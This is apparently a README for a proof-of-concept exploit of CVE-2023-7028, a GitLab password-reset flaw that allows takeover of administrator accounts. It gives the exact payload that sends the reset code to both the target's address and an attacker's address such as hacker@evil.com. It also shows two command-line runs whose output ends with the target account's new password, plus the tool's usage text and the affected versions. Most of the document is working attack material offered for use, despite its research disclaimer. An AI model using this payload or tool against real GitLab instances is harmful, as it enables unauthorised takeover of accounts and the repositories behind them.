# CVE-2023-7028 | Account-Take-Over Gitlab

## Disclamer
This code is a proof of concept of the vulnerability, I'm not pushing anyone to use it on gitlab instances they don't own.  
This tool has been developed for research and educational purposes only and I will not be held responsible for any use you may make of it.

## Description: 

CVE-2023-7028 refers to an Account-Take-Over vulnerability that allows users to take control of the gitlab administrator account without user interaction.

The vulnerability lies in the management of emails when resetting passwords. An attacker can provide 2 emails and the reset code will be sent to both.   
It is therefore possible to provide the e-mail address of the target account as well as that of the attacker, and to reset the administrator password.  
*(Gitlab points out that 2-factor authentication prevents this vulnerability from being exploited, since an attacker, even after resetting the password, will not be able to log in.)*  

This vulnerability was discovered by [asterion04](https://hackerone.com/asterion04)

## Payload:
Here's an example payload
```
user[email][]=my.target@example.com&user[email][]=hacker@evil.com
```

## POC:

##### Method 1: Using temp email
```bash
python3 ./CVE-2023-7028.py -u https://gitlab.example.com/ -t my.target@example.com

[DEBUG] Getting temporary mail
[DEBUG] Scrapping available domains on 1secmail.com
[DEBUG] 8 domains found
[DEBUG] Temporary mail: 6grp7ert9y@laafd.com
[DEBUG] Getting authenticity_token ...
[DEBUG] authenticity_token = bc91lpzwTOaY9dg5SWjLvvDDb61j6ZunCX4DXYlSnWz9Y3zK35SPiLNShhrDrPVDgY_AzQjzpD5qVt2WXeolog
[DEBUG] Sending reset password request
[DEBUG] Emails sended to my.target@example.com and hacker@evil.com !
[DEBUG] Waiting mail, sleeping for 7.5 seconds
[DEBUG] Getting link using temp-mail | Try N°1 on 5
[DEBUG] Getting last mail for 6grp7ert9y@laafd.com
[DEBUG] 1 mail(s) found
[DEBUG] Reading the last one
[DEBUG] Generating new password
[DEBUG] Getting authenticity_token ...
[DEBUG] authenticity_token = RN6gypVz7Zxtu2zRsJmKPsDHNumIH_UPvdn7aQoWRBnUcqmW1hcu8kYcMvI6XbTDsYuZieMFypbe8SWi3q781w
[DEBUG] Changing password to l3mG2v2XN4UBzbN18ZkW
[DEBUG] CVE_2023_7028 succeed !
        You can connect on https://gitlab.example.com/users/sign_in
        Username: my.target@example.com
        Password: l3mG2v2XN4UBzbN18ZkW
```

##### Method 2: Using evil email
```bash
python3 ./CVE-2023-7028.py -u https://gitlab.example.com/ -t my.target@example.com -e hacker@evil.com

[DEBUG] Getting authenticity_token ...
[DEBUG] authenticity_token = 1Yt1EUeWSL-oiSV7v1Z6ghdCDG3w0FFCQB8Uc5B5GAodVNJ26OlPT8HtYYleGXB9F0otas3gnHOtRfhFall8pQ
[DEBUG] Sending reset password request
[DEBUG] Emails sended to my.target@example.com and hacker@evil.com !
        Input link received by mail: https://gitlab.example.com/users/password/edit?reset_password_token=U8PSU7DXdebdTD3GjMiX
[DEBUG] Generating new password
[DEBUG] Getting authenticity_token ...
[DEBUG] authenticity_token = N7gs43C9ZMxdniA9UEzzfH2Rlhgejt75M1Kw88vaarP_Z4uE38JjPDT6ZM-xA_mDfZm3HyO-E8jeCFzFMfoOHA
[DEBUG] Changing password to EU7XIYjlawjb5tH2jgmU
[DEBUG] CVE_2023_7028 succeed !
        You can connect on https://gitlab.example.com/users/sign_in
        Username: my.target@example.com
        Password: EU7XIYjlawjb5tH2jgmU
```


## Help
```md
$ python3 .\CVE-2023-7028.py -h
usage: CVE-2023-7028.py [-h] -u URL -t TARGET [-e EVIL]

This tool automates CVE-2023-7028 on gitlab

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Gitlab url
  -t TARGET, --target TARGET
                        Target email
  -e EVIL, --evil EVIL  Evil email
  -p PASSWORD, --password PASSWORD
                        Password
```

#### Note:
Without the `--evil` option, which specifies the attacker's email address, the script uses a **public temp-mail** to find the password reset link.   
=> *Be careful if this poc is used during a pentest.*



## Versions concerned
- 16.1 to 16.1.5
- 16.2 to 16.2.8
- 16.3 to 16.3.6
- 16.4 to 16.4.4
- 16.5 to 16.5.5
- 16.6 to 16.6.3
- 16.7 to 16.7.1

## References: 
- https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/
- https://docs.gitlab.com/ee/install/docker.html
- https://www.cert.ssi.gouv.fr/avis/CERTFR-2024-AVI-0030/
